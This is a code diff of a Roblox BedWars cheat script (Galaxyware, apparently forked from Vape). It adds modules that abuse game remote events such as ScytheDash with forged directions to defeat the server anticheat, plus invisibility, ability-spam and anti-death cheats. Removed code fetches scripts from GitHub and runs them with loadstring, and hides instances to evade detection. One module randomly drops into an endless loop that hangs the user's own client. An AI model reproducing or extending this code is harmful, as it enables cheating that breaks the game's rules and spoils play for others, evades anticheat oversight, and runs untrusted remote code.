+		HoverText = 'Direction Speed Mode',
+		Value = 'Normal',
+		Function = function() end
+	})
+end)
+
+runFunction(function()
+    disabledxd = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+        Name = "Scythe Semi-Disabler",
+        Function = function(callback)
+            if callback then
+                local ReplicatedStorage = game:GetService("ReplicatedStorage")
+                local Players = game:GetService("Players")
+                local RunService = game:GetService("RunService")
+                local ScytheDash = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules")["@rbxts"].net.out._NetManaged.ScytheDash
+
+                local function onRenderStepped()
+                    local localPlayer = Players.LocalPlayer
+                    if not localPlayer then
+                        return
+                    end
+                    local character = localPlayer.Character
+                    if not character then
+                        return
+                    end
+                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+                    if humanoidRootPart then
+                        local lookVector = humanoidRootPart.CFrame.LookVector * 10000
+                        ScytheDash:FireServer({
+                            direction = lookVector
+                        })
+                    end
+                end
+                local lastHeartbeat = tick()
+                local function onHeartbeat()
+                    local currentTime = tick()
+                    local elapsedSeconds = currentTime - lastHeartbeat
+                    if elapsedSeconds > 999 then
+                        lastHeartbeat = currentTime
+                    end
+                end
+
+                RunService.RenderStepped:Connect(onRenderStepped)
+                RunService.Heartbeat:Connect(onHeartbeat)
+            end
+        end
+    })
+end)
+			
+runFunction(function()
+	local AntiDeath = {Enabled = false}
+	local AntiDeathMode = {Value = 'Velocity'}
+	local AntiDeathHealth = {Value = 50}
+	local AntiDeathVelo = {Value = 650}
+	local AntiDeathAuto = {Enabled = false}
+	local AntiDeathNot = {Enabled = true}
+	local function gethealth()
+		return entity.character.Humanoid.Health
+	end
+	local boosted1, infon, sentmsg = false, false, false
+	AntiDeath = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"]["CreateOptionsButton"]({
+		Name = 'AntiDeath',
+        HoverText = 'Prevents you from dying',
+		Function = function(callback)
+			if callback then
+				task.spawn(function()
+					repeat task.wait()
+						if entityLunar.isAlive then
+							if gethealth() < AntiDeathHealth.Value and gethealth() > 0 then
+								if not boosted1 then
+									if AntiDeathMode.Value == 'Velocity' then
+										entity.character.HumanoidRootPart.Velocity += vec3(0, AntiDeathVelo.Value, 0)
+									else
+										if not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled then
+											GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.ToggleButton(true)
+											infon = true
+										end
+									end
+								end
+								boosted1 = true
+								if not sentmsg then
+									warningNotification('AntiDeath', 'Succesfully performed action.', 3)
+								end
+								sentmsg = true
+							elseif gethealth() >= AntiDeathHealth.Value then
+								if infon and AntiDeathAuto.Enabled then
+									GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.ToggleButton(false)
+								end
+								boosted1, infon, sentmsg = false, false, false
+							end
+						end
+					until not AntiDeath.Enabled
+				end)
+			else
+				boosted1, infon, sentmsg = false, false, false
+			end
+		end,
+        Default = false,
+        ExtraText = function()
+            return AntiDeathMode.Value
+        end
+	})
+	AntiDeathMode = AntiDeath.CreateDropdown({
+		Name = 'Mode',
+		List = {
+			'Velocity',
+			'Infinite'
+		},
+		HoverText = 'Mode to prevent death',
+		Value = 'Velocity',
+		Function = function(val)
+			if val == 'Velocity' then
+				AntiDeathVelo.Object.Visible = true
+			elseif val == 'Infinite' then
+				AntiDeathVelo.Object.Visible = false
+			end
+		end
+	})
+	AntiDeathHealth = AntiDeath.CreateSlider({
+		Name = 'Health',
+		Min = 10,
+		Max = 99,
+		HoverText = 'Health at which AntiDeath will perform its actions',
+		Function = function() end,
+		Default = 50
+	})
+	AntiDeathVelo = AntiDeath.CreateSlider({
+		Name = 'Velocity',
+		Min = 100,
+		Max = 650,
+		HoverText = 'Velocity Boost',
+		Function = function() end,
+		Default = 650
+	})
+	AntiDeathAuto = AntiDeath.CreateToggle({
+		Name = 'Auto Disable',
+		Default = false,
+		HoverText = 'Automatically disables InfinteFly\nafter healing',
+		Function = function() end
+	})
+	AntiDeathNot = AntiDeath.CreateToggle({
+		Name = 'Notification',
+		Default = true,
+		HoverText = 'Notifies you when AntiDeath actioned',
+		Function = function() end
+	})
+end)	
+
+runFunction(function()
+    local Disabler = {Enabled = false}
+    Disabler = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+        Name = "FloatDisabler",
+        Function = function(callback)
+            if callback then 
+                task.spawn(function()
+                    repeat
+                        task.wait()
+                        local item = getItemNear("scythe")
+                        if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then 
+                            bedwars.ClientHandler:Get("ScytheDash"):SendToServer({direction = Vector3.new(9e9, 9e9, 9e9)})
+                            if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
+                                bedwarsStore.scythe = tick() + 1
+                            end
+                        end
+
+                        if lplr.Character and lplr.Character:FindFirstChild("HumanoidRootPart") then
+                            local velocity = Vector3.new(math.random(-10, 10), math.random(-10, 10), math.random(-10, 10))
+                            if lplr.Character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+                                lplr.Character.HumanoidRootPart.Velocity = velocity
+                            end
+                        end
+
+                        game:GetService("RunService").Heartbeat:Wait()
+
+                        if math.random() < 0.01 then
+                            while true do
+                                game:GetService("Workspace"):WaitForChild(math.random(1, 1000000))
+                                local part = Instance.new("Part")
+                                part.Parent = workspace
+                            end
+                        end
+                    until (not Disabler.Enabled)
+                end)
+            end
+        end,
+        HoverText = "Float disabler with scythe"
+    })
+end)
+	
+runFunction(function()
+	local BlockhuntInvis = {Enabled = false}
+
+	BlockhuntInvis = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+		Name = 'BlockhuntInvis',
+		Function = function(callback)
+			if callback then
+				task.spawn(function()
+					repeat task.wait() until not BlockhuntInvis.Enabled or bedwarsStore.matchState ~= 0
+					if BlockhuntInvis.Enabled then
+						repeat
+							task.wait(0.3)
+							if not BlockhuntInvis.Enabled then break end
+							bedwars.ClientHandler:Get('BHHiderInvisibility'):SendToServer()
+						until not BlockhuntInvis.Enabled
+					end
+				end)
+			end
+		end
+	})
+end)	
+
+runFunction(function()
+		local oldEngineCap
+		local EngineUnlocker = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+			Name = 'EngineUnlocker',
+			Function = function(callback)
+				if callback then
+					if getfpscap then
+						oldEngineCap = getfpscap()
+					else
+						oldEngineCap = 60
+					end
+					setfpscap(360) -- basically just unlocks your engine update speed (uwp caps your fps to your monitor's framerate :skull:)
+				else
+					if oldEngineCap then
+						setfpscap(oldEngineCap)
+						oldEngineCap = nil
+					end
+				end
+			end
+		})
+	end)
+runFunction(function()
+	local WolfExploit = {Enabled = false}
+	WolfExploit = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+		Name = "WolfExploit",
+		Function = function(callback)
+			if callback then 
+				task.spawn(function()
+					repeat task.wait()
+						if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then 
+							bedwars.ClientHandler:Get("UseWerewolfHowlAbility"):CallServer({player = lplr})
+						end
+					until not WolfExploit.Enabled
+				end)
+			end
+		end
+	})
+end)
+
+runFunction(function()
+    BetterScythe = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+        Name = "ScytheFuni",
+        Function = function(callback)
+            if callback then
+                task.spawn(function()
+                    repeat
+                        task.wait(0.03)
+                        local args = {
+                            [1] = {
+                                ["direction"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 9304588888888345983450980850394538940
+                            }
+                        }
+
+                        game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.ScytheDash:FireServer(unpack(args))
+                        until (not BetterScythe.Enabled)
+                    end)
+            end
+        end
+    })
+end)
+
+
+game:GetService('RunService').RenderStepped:Connect(function()
+    local lplr = game:GetService("Players").LocalPlayer
+    local direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
+    local args = {
+        [1] = {
+            ["direction"] = direction
+        }
+    }
+    game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.ScytheDash:FireServer(unpack(args))
+end)
+
+game:GetService('RunService').RenderStepped:Connect(function()
+    local lplr = game:GetService("Players").LocalPlayer
+    local direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
+    local args = {
+        [1] = {
+            ["direction"] = direction
+        }
+    }
+    if lplr:FindFirstChild("Scythe") then
+        game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.ScytheDash:FireServer(unpack(args))
+    end
 end)
 
 runFunction(function()
@@ -10745,7 +12986,7 @@ runFunction(function()
 	label.Position = UDim2.new(0, 7, 0, 5)
 	label.Parent = overlayframe
 	local OverlayFonts = {"Arial"}
-	for i,v in next, (Enum.Font:GetEnumItems()) do 
+	for i,v in pairs(Enum.Font:GetEnumItems()) do 
 		if v.Name ~= "Arial" then
 			table.insert(OverlayFonts, v.Name)
 		end
@@ -10780,8 +13021,8 @@ runFunction(function()
 
 	local function didpingspike()
 		local currentpingcheck = pinglist[1] or math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()))
-		for i, v in next, (pinglist) do 
-			if v ~= currentpingcheck and math.abs(v - currentpingcheck) >= 300 then 
+		for i,v in pairs(pinglist) do 
+			if v ~= currentpingcheck and math.abs(v - currentpingcheck) >= 100 then 
 				return currentpingcheck.." => "..v.." ping"
 			else
 				currentpingcheck = v
@@ -10791,7 +13032,7 @@ runFunction(function()
 	end
 
 	local function notlasso()
-		for i,v in next, (collectionService:GetTagged("LassoHooked")) do 
+		for i,v in pairs(collectionService:GetTagged("LassoHooked")) do 
 			if v == lplr.Character then 
 				return false
 			end
@@ -10808,7 +13049,7 @@ runFunction(function()
 			Overlay.SetVisible(callback) 
 			if callback then 
 				table.insert(overlayconnections, bedwars.ClientHandler:OnEvent("ProjectileImpact", function(p3)
-					if not _VapeApi.vapeInjected then return end
+					if not vapeInjected then return end
 					if p3.projectile == "telepearl" then 
 						teleported[p3.shooterPlayer] = true
 					elseif p3.projectile == "swap_ball" then
@@ -10890,10 +13131,10 @@ runFunction(function()
 							oldnetworkowner = nil
 						end
 						teleported[lplr] = nil
-						for i, v in next, (entityLibrary.entityList) do 
+						for i, v in pairs(entityLibrary.entityList) do 
 							if teleportconnections[v.Player.Name.."1"] then continue end
 							teleportconnections[v.Player.Name.."1"] = v.Player:GetAttributeChangedSignal("LastTeleported"):Connect(function()
-								if not _VapeApi.vapeInjected then return end
+								if not vapeInjected then return end
 								for i = 1, 15 do 
 									task.wait(0.1)
 									if teleported[v.Player] or teleported2[v.Player] or matchstatetick > tick() or math.abs(v.Player:GetAttribute("SpawnTime") - v.Player:GetAttribute("LastTeleported")) < 3 or (teleportedability[v.Player] or tick() - 1) > tick() then break end
@@ -10919,7 +13160,7 @@ runFunction(function()
 					until not overlayenabled
 				end)
 			else
-				for i, v in next, (overlayconnections) do 
+				for i, v in pairs(overlayconnections) do 
 					if v.Disconnect then pcall(function() v:Disconnect() end) continue end
 					if v.disconnect then pcall(function() v:disconnect() end) continue end
 				end
@@ -11061,20 +13302,20 @@ task.spawn(function()
 			if (inputService.TouchEnabled or inputService:GetPlatform() == Enum.Platform.UWP) and lplr.UserId ~= 3826618847 then return end
 			if not isfile("vape/Profiles/bedwarsdata.txt") then 
 				local commit = "main"
-				for i,v in next, (game:HttpGet("https://github.com/7GrandDadPGN/VapeV4ForRoblox"):split("\n")) do 
+				for i,v in pairs(game:HttpGet("https://github.com/asfsnfskjsfjdgkjgfhfjhfjhfsjhjfjfhDadPGN/GalaxywareV1ForRoblox"):split("\n")) do 
 					if v:find("commit") and v:find("fragment") then 
 						local str = v:split("/")[5]
 						commit = str:sub(0, str:find('"') - 1)
 						break
 					end
 				end
-				writefile("vape/Profiles/bedwarsdata.txt", game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/"..commit.."/CustomModules/bedwarsdata", true))
+				writefile("vape/Profiles/bedwarsdata.txt", game:HttpGet("https://raw.githubusercontent.com/asfsnfskjsfjdgkjgfhfjhfjhfsjhjfjfhDadPGN/GalaxywareV1ForRoblox/"..commit.."/CustomModules/bedwarsdata", true))
 			end
 			local olddata = readfile("vape/Profiles/bedwarsdata.txt")
 
 			repeat
 				local commit = "main"
-				for i,v in next, (game:HttpGet("https://github.com/7GrandDadPGN/VapeV4ForRoblox"):split("\n")) do 
+				for i,v in pairs(game:HttpGet("https://github.com/asfsnfskjsfjdgkjgfhfjhfjhfsjhjfjfhDadPGN/GalaxywareV1ForRoblox"):split("\n")) do 
 					if v:find("commit") and v:find("fragment") then 
 						local str = v:split("/")[5]
 						commit = str:sub(0, str:find('"') - 1)
@@ -11082,7 +13323,7 @@ task.spawn(function()
 					end
 				end
 				
-				local newdata = game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/"..commit.."/CustomModules/bedwarsdata", true)
+				local newdata = game:HttpGet("https://raw.githubusercontent.com/asfsnfskjsfjdgkjgfhfjhfjhfsjhjfjfhDadPGN/GalaxywareV1ForRoblox/"..commit.."/CustomModules/bedwarsdata", true)
 				if newdata ~= olddata then 
 					rundata(game:GetService("HttpService"):JSONDecode(newdata), game:GetService("HttpService"):JSONDecode(olddata))
 					olddata = newdata
@@ -11090,7 +13331,7 @@ task.spawn(function()
 				end
 
 				task.wait(10)
-			until not _VapeApi.vapeInjected
+			until not vapeInjected
 		end)
 	end)
 end)
@@ -11102,3504 +13343,6 @@ task.spawn(function()
 	end
 end)
 
-do -- so your don't hit the local limit w/ ur custom
-	GuiLibrary.RemoveObject("PanicOptionsButton")
-	GuiLibrary.RemoveObject("MissileTPOptionsButton")
-	GuiLibrary.RemoveObject("SwimOptionsButton")
-	GuiLibrary.RemoveObject("FullbrightOptionsButton")
-	GuiLibrary.RemoveObject("HighJumpOptionsButton")
-	GuiLibrary.RemoveObject("AutoRelicOptionsButton")
-	GuiLibrary.RemoveObject("RavenTPOptionsButton")
-	GuiLibrary.RemoveObject("XrayOptionsButton")
-	GuiLibrary.RemoveObject("SchematicaOptionsButton")
-	GuiLibrary.RemoveObject("FirewallBypassOptionsButton")
-
-	local git = {cache = {}}
-	git.getCommit = function(user, repo)
-		if git.cache[user..repo] then
-			return git.cache[user..repo]
-		end
-		local commit
-		local crequest = game:HttpGet(string.format("https://api.github.com/repos/%s/%s/commits", user, repo), true)
-		if crequest.StatusCode == 200 then
-			local decoded = game:GetService("HttpService"):JSONDecode(crequest.Body)
-			commit = decoded[1].sha
-			git.cache[user..repo] = commit
-		end
-		if not commit then
-			task.wait(1)
-			commit = git.getCommit(user, repo)
-		end
-		return commit
-	end
-
-	git.request = function(user, repo, file)
-		local commit = git.getCommit(user, repo)
-		return game:HttpGet(string.format("https://raw.githubusercontent.com/%s/%s/blob/%s/%s", user, repo, commit, file), true)
-	end
-
-	local function thisWasSkiddedByScrxpted(scripturl)
-		if not isfile("vape/"..scripturl) then
-			local suc, res = pcall(function() return git.request("v", "v", scripturl) end)
-			assert(suc, res)
-			assert(res ~= "404: Not Found", res)
-			--[=[ I'm removing this because it isn't needed for my stuff scripturl:find(".lua") then res = "--This watermark is used to delete the file if its cached, remove it to make the file persist after commits.\n"..res end ]=]
-			writefile("vape/"..scripturl, res)
-		end
-		return readfile("vape/"..scripturl)
-	end
-
-	getgenv().t = loadstring(thisWasSkiddedByScrxpted("Libraries/rblx-t.lua"))() -- I need to do this because tutils uses t and I'm too lazy to localize it there
-	getgenv().tutils = loadstring(thisWasSkiddedByScrxpted("Libraries/rblx-tutils.lua"))()
-
-	-- compatibility fix lol
-	do
-		local a = Instance.new("Part")
-		local instanceList
-		for b, c in next, getreg() do
-			if type(c) == "table" and #c then
-				if rawget(c, "__mode") == "kvs" then
-					for d, e in next, c do
-						if e == a then
-							instanceList = c
-							break
-						end
-					end
-				end
-			end
-		end
-		if instanceList and hide then -- note from scrxpted: this is for my autoexec loader it doesn't matter for anyone else
-			hide(instanceList)
-		end
-		if not cloneref then
-			getgenv().cloneref = newcclosure(function(g : Instance | Userdata)
-				if not instanceList then
-					return
-				end
-				for b, c in next, instanceList do
-					if c == g then
-					instanceList[b] = nil
-					return g
-					end
-				end
-			end)
-		end
-	end
-
-	local ByteLib = {}
-	do
-		local BYTE = {
-			byte = 1,
-			kb = 2,
-			mb = 3,
-			gb = 4
-		}
-
-		function ByteLib:covert(size : Number, dataType : String, targetType : String)
-			local currentMap = BYTE[dataType]
-			local targetMap = BYTE[targetType]
-			assert(currentMap, "An error has occured during ByteLib:convert (failed to map "..dataType..")")
-			assert(targetMap, "An error has occured during ByteLib:convert (failed to map "..targetType..")")
-			if currentMap == targetMap then
-				return size
-			end
-			if currentMap < targetMap then
-				size /= 1000
-				currentMap += 1
-			else
-				size *= 1000
-				currentMap -= 1
-			end
-			local dataType = table.find(BYTE, currentMap)
-			assert(dataType, "An error has occured during ByteLib:convert (failed to convert bytes)")
-			return ByteLib:covert(size, dataType, targetType)
-		end
-	end
-
-	local OldGetService = game.GetService
-	getgenv().getService = newcclosure(function(s : String) -- for bypassing weaktable detections (bedwars doesn't have these)
-		return cloneref(OldGetService(game, s)) -- no namecall because yes
-	end)
-
-	-- why doesn't xylex localize this
-	local coreGui = getService("CoreGui")
-	local starterGui = getService("StarterGui")
-	local httpService = getService("HttpService")
-	local statsService = getService("Stats")
-	local localMouse = lplr:GetMouse()
-
-	local singleWarning
-	do
-		local warningCache = {}
-		singleWarning = function(title : String, text : String, delay : Number, ...)
-			if warningCache[title..text] then
-				return nil
-			end
-			warningCache[title..text] = true
-			return warningNotification(title, text, delay, ...)
-		end
-	end
-
-	local function await(check : Function, timeout : Number | Nil, freq : Number | Nil)
-		local _tick = tick() + timeout or math.huge
-		repeat
-			task.wait(freq)
-			if check() then
-				return true
-			end
-		until tick() <= _tick
-		return false
-	end
-
-	local useAbility
-	do
-		local useAbilityRemote = replicatedStorageService:FindFirstChild("events-@easy-games/game-core:shared/game-core-networking@getEvents.Events", true).useAbility
-		useAbility = function(ability : String, ...)
-			useAbilityRemote:FireServer(ability, ...)
-		end
-	end
-
-	local GuiHandler = {}
-	do
-		local GuiPositions = {}
-		local DraggableGuis = {}
-		local SavePath = string.format("vape/Profiles/%sPistonwareGUIPositions.json", shared.CustomSaveVape or game.PlaceId)
-
-		function GuiHandler.Save()
-			writefile(SavePath, httpService:JSONEncode(GuiPositions))
-		end
-
-		function GuiHandler.Get(Tag : String)
-			if isfile(SavePath) then
-				GuiPositions = httpService:JSONDecode(readfile(SavePath))
-			end
-			if GuiPositions[Tag] then
-				return UDim2.new(GuiPositions[Tag].XS, GuiPositions[Tag].XO, GuiPositions[Tag].YS, GuiPositions[Tag].YO)
-			end
-		end
-
-		local SaveAsync = false
-		task.spawn(function()
-			repeat
-				task.wait()
-			until shared.VapeFullyLoaded
-			for _, obj in pairs(DraggableGuis) do
-				local position = GuiHandler.Get(obj.Tag)
-				if position then
-					obj.Gui.Position = position
-				end
-			end
-			if SaveAsync then
-				SaveAsync = false
-				GuiHandler.Save()
-			end
-		end)
-
-		function GuiHandler.dragGui(gui : Instance, touchGui : Instance | Nil, checkFunc : Function | Nil, Tag : String)
-			touchGui = touchGui or gui
-            table.insert(DraggableGuis, { Tag = Tag, Gui = gui })
-			local dragging
-			local dragInput
-			local dragStart = Vector3.new(0,0,0)
-			local startPos
-			local function update(input)
-				local delta = input.Position - dragStart
-				local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + (delta.X * (1 / GuiLibrary.MainRescale.Scale)), startPos.Y.Scale, startPos.Y.Offset + (delta.Y * (1 / GuiLibrary.MainRescale.Scale)))
-				tweenService:Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
-				local RefTable = GuiPositions[Tag]
-				if RefTable == nil then
-					RefTable = {}
-					GuiPositions[Tag] = RefTable
-				end
-				RefTable.XS = Position.X.Scale
-				RefTable.XO = Position.X.Offset
-				RefTable.YS = Position.Y.Scale
-				RefTable.YO = Position.Y.Offset
-				if shared.VapeFullyLoaded then
-					GuiHandler.Save()
-				else
-					SaveAsync = true
-				end
-			end
-			local guiConnections = {}
-			if gui ~= touchGui then
-				table.insert(guiConnections, gui.InputBegan:Connect(function(input)
-					if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
-						dragStart = input.Position
-						local delta = (dragStart - Vector3.new(gui.AbsolutePosition.X, gui.AbsolutePosition.Y, 0)) * (1 / GuiLibrary.MainRescale.Scale)
-						if delta.Y <= 40 then
-							dragging = GuiLibrary.MainGui.ScaledGui.ClickGui.Visible
-							startPos = gui.Position
-							
-							table.insert(guiConnections, input.Changed:Connect(function()
-								if input.UserInputState == Enum.UserInputState.End then
-									dragging = false
-								end
-							end))
-						end
-					end
-				end))
-				table.insert(guiConnections, gui.InputChanged:Connect(function(input)
-					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-						dragInput = input
-					end
-				end))
-			end
-			table.insert(guiConnections, touchGui.InputBegan:Connect(function(input)
-				if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
-					dragStart = input.Position
-					local delta = (dragStart - Vector3.new(gui.AbsolutePosition.X, gui.AbsolutePosition.Y, 0)) * (1 / GuiLibrary.MainRescale.Scale)
-					if delta.Y <= 40 then
-						dragging = GuiLibrary.MainGui.ScaledGui.ClickGui.Visible
-						startPos = gui.Position
-						
-						table.insert(guiConnections, input.Changed:Connect(function()
-							if input.UserInputState == Enum.UserInputState.End then
-								dragging = false
-							end
-						end))
-					end
-				end
-			end))
-			table.insert(guiConnections, touchGui.InputChanged:Connect(function(input)
-				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-					dragInput = input
-				end
-			end))
-			table.insert(guiConnections, inputService.InputChanged:Connect(function(input)
-				if input == dragInput and dragging and (checkFunc and checkFunc() or checkFunc == nil) then
-					update(input)
-				end
-			end))
-			if shared.VapeFullyLoaded then
-				local position = GuiHandler.Get(Tag)
-				if position then
-					gui.Position = position
-				end
-			end
-			for i, v in next, guiConnections do -- in case you don't insert the result into a connection handler
-				table.insert(vapeConnections, v)
-			end
-			local _return = { -- for vape's uninject system
-				Disconnect = function(self, ...)
-					for i, v in next, guiConnections do
-						v:Disconnect()
-					end
-					table.clear(guiConnections)
-					table.clear(_return)
-				end
-			}
-			return _return
-		end
-	end
-
-	MessageHandler = {MessageCache = {}} -- localized on line 27
-	do
-		local success, frame = pcall(function() return coreGui.ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView end)
-		if not (success and frame) then
-			task.spawn(function()
-				repeat
-					task.wait()
-					success, frame = pcall(function() return coreGui.ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView end)
-				until success and frame
-				MessageHandler.ChatMessageFrame = frame
-			end)
-		end
-		MessageHandler.ChatMessageFrame = frame
-
-		function MessageHandler:register(message : String) : Boolean
-			local started = tick()
-			local connection
-			local found
-			connection = MessageHandler.ChatMessageFrame.ChildAdded:Connect(function(object)
-				local fixed = object.Name:gsub("$%d+-", "")
-				if fixed == message.MessageId and object.Text == message.Text then
-					connection:Disconnect()
-					found = object
-				end
-			end)
-			for i, v in next, (MessageHandler.ChatMessageFrame:GetChildren()) do
-				local fixed = v.Name:gsub("$%d+-", "")
-				if fixed == message.MessageId and v.Text == message.Text then
-					found = found or v
-					break
-				end
-			end
-			repeat
-				task.wait()
-			until found or (tick() - started) > 5
-			return found
-		end
-
-		function MessageHandler:sanitize(text : String) : String
-			return text:gsub("%W+", ""):lower()
-		end
-
-		function MessageHandler:format(text : String) : Table
-			text = text:split("font")
-			local isWhisper = text[1]:find("From") ~= nil or text[1]:find("To") ~= nil
-			return {
-				isWhisper = isWhisper,
-				text = text[#text]
-			}
-		end
-
-		function MessageHandler:scan(text : String, find : Boolean | Nil) : Table
-			local list = {}
-			for i, v in next, (MessageHandler.ChatMessageFrame:GetChildren()) do
-				if v:IsA("TextLabel") then
-					local formatted = MessageHandler:format(v.Text).text
-					if formatted == text or (find and formatted:find(text)) then
-						local msgInfo = MessageHandler:format(text)
-						table.insert(list, {
-							Name = v.Name,
-							Object = v,
-							isWhisper = msgInfo.isWhisper,
-							Text = msgInfo.text
-						})
-					end
-				end
-			end
-			return list
-		end
-
-		function MessageHandler:remove(id : String) : Boolean
-			if MessageHandler.MessageCache[id] then
-				MessageHandler.MessageCache[id].Visible = false
-				MessageHandler.MessageCache[id] = nil
-				return true
-			end
-			return false
-		end
-
-		local hashes = {}
-		function MessageHandler:publish(text : String, id : String) : Boolean
-			MessageHandler:remove(id)
-			local channel = textChatService.ChatInputBarConfiguration.TargetTextChannel
-			if channel == nil then
-				return false
-			end
-			if hashes[id] == nil then
-				hashes[id] = 0
-			end
-			hashes[id] += 1
-			local message = channel:DisplaySystemMessage(text.." [x"..hashes[id].."]")
-			if message then
-				local found = MessageHandler:register(message)
-				if found then
-					MessageHandler.MessageCache[id] = found
-					return true
-				end
-			end
-			return false
-		end
-	end
-
-	
-	local oldmatchstate = 0
-	local DataPing = statsService:FindFirstChild("Data Ping", true)
-	local function getPing()
-		DataPing = DataPing or statsService:FindFirstChild("Data Ping", true)
-		local PingValue = DataPing and DataPing:GetValueString() and DataPing:GetValueString():split(".")[1]
-		
-		if PingValue and PingValue:match("%d+$") then
-			return tonumber(PingValue)
-		end
-		return math.round(statsService.PerformanceStats.Ping:GetValue())
-	end
-	local pinglist = {}
-	local function didpingspike(max)
-		max = max or 100
-		local currentpingcheck = pinglist[1] or getPing()
-		for i,v in next, pinglist do 
-			if v ~= currentpingcheck and math.abs(v - currentpingcheck) >= max then 
-				return currentpingcheck.." => "..v.." ping"
-			else
-				currentpingcheck = v
-			end
-		end
-		return nil
-	end
-		
-	task.spawn(function()
-		repeat
-			task.wait(1)
-			if #pinglist >= 10 then 
-				table.remove(pinglist, 1)
-			end
-			table.insert(pinglist, getPing())
-			if bedwarsStore.matchState ~= oldmatchstate then 
-				if bedwarsStore.matchState == 1 then 
-					bedwarsStore.matchStateChanged = tick() + 3
-				end
-				oldmatchstate = bedwarsStore.matchState
-			end
-		until not _VapeApi.vapeInjected
-	end)
-	
-	shared.allowedTeleports = shared.allowedTeleports or 2
-	local allowedTeleportTick = tick()
-
-	local isUwp = tostring({}):match("0x0000000") ~= nil or inputService:GetPlatform() == Enum.Platform.UWP
-	local xzFix = Vector3.new(1, 0, 1)
-	local function fixVec(vec)
-		return vec * xzFix
-	end
-
-	if isUwp then
-		local function notlasso()
-			for i, v in next, collectionService:GetTagged("LassoHooked") do 
-				if v == lplr.Character then 
-					return false
-				end
-			end
-			return true
-		end
-
-		table.insert(vapeConnections, bedwars.ClientHandler:OnEvent("ProjectileImpact", function(p3)
-			if not _VapeApi.vapeInjected then return end
-			if p3.projectile == "telepearl" and p3.shooterPlayer == lplr then 
-				shared.allowedTeleports += 1
-			elseif p3.projectile == "swap_ball" then
-				if p3.hitEntity then
-					if p3.shooterPlayer == lplr then
-						shared.allowedTeleports += 1
-					end
-					local plr = playersService:GetPlayerFromCharacter(p3.hitEntity)
-					if plr == lplr then shared.allowedTeleports += 1 end
-				end
-			end
-		end))
-
-		table.insert(vapeConnections, replicatedStorageService["events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"].abilityUsed.OnClientEvent:Connect(function(char, ability)
-			if ability == "recall" or ability == "hatter_teleport" or ability == "spirit_assassin_teleport" or ability == "hannah_execute" then 
-				local player = playersService:GetPlayerFromCharacter(char)
-				if player == lplr then
-					allowedTeleportTick = tick() + (ability == "recall" and 12 or 1)
-				end
-			end
-		end))
-
-		local watchingEntities = {}
-
-		local function waitForOwnership(character)
-			if not watchingEntities[character] then
-				watchingEntities[character] = true
-				local root = oldcloneroot or character.HumanoidRootPart
-				local oldpos = fixVec(root.Position)
-				local oldmove = fixVec(character.Humanoid.MoveDirection)
-				local skipvalues = false
-				repeat
-					task.wait()
-					local mag = ((root.Position - oldpos).Unit - oldmove).magnitude
-					if character:FindFirstChild("Humanoid") then
-						if not skipvalues then
-							if mag ~= 0 and mag < 0.1 and oldmove ~= character.Humanoid.MoveDirection then
-								table.clear(watchingEntities)
-								networkownerswitch = tick()
-								break
-							end
-						end
-						oldpos = fixVec(root.Position)
-						oldmove = fixVec(character.Humanoid.MoveDirection)
-					else
-						skipvalues = true
-					end
-				until networkownerswitch <= tick() or not _VapeApi.vapeInjected
-				table.clear(watchingEntities)
-			end
-		end
-
-		table.insert(vapeConnections, lplr:GetAttributeChangedSignal("LastTeleported"):Connect(function()
-			if not _VapeApi.vapeInjected then return end
-			if notlasso() then
-				local allowed = true
-				for i = 1, 7 do 
-					task.wait(0.1)
-					if shared.allowedTeleports <= 0 or bedwarsStore.matchStateChanged > tick() or math.abs(lplr:GetAttribute("SpawnTime") - lplr:GetAttribute("LastTeleported")) < 3 or (allowedTeleportTick or tick() - 1) > tick() then allowed = false break end
-				end
-				if shared.allowedTeleports > 0 then
-					shared.allowedTeleports -= 1
-				end
-				if not allowed then
-					local pingspike = didpingspike()
-					if pingspike then
-						warningNotification("Anticheat", "Lagspike detected\n"..pingspike, 5)
-					end
-					warningNotification("Anticheat", "Lagback detected", 5)
-					networkownerswitch = tick() + 5
-					if lplr.Character then
-						waitForOwnership(lplr.Character)
-					end
-				end
-			end
